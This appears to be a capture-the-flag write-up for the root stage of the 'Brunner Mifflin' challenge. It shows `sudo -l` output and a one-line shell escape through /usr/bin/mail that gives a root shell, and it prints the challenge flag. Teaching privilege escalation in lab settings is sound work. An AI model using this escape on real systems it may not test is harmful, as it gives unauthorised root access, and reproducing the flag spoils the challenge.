# Challenge Name

Brunner Mifflin (Root)

# Author

Emil8250

# Description

After the user flag, the second part asked me to investigate rumours of company-wide email surveillance. I already had shell access as `itguy` and needed to reach root.

# Solution

With the `itguy` account working, I started checking what the user could do on the Linux host. A lot of the usual enumeration didn't give me anything interesting, but `sudo -l` did:

```text
User itguy may run the following commands:
    (root) NOPASSWD: /usr/bin/mail
```

That was the real clue. The user was allowed to run the mail program as root without a password, which fitted the challenge's hint about monitoring emails.

Some mail programs let you run shell commands from inside the program. I tried the shell escape through `mail`:

```bash
sudo /usr/bin/mail --exec='!/bin/sh'
```

It dropped me into a root shell. From there I went to root's home directory and read `flag.txt`.

The lesson here was simple: **always check `sudo -l`**. A command that looks harmless can be enough for root access if it has a shell escape.

# Flag

```text
brunner{1tguy_t4k35_m41l_s3cur1ty_v3ry_53r10u5}
```

# Solved By

Kazikiri
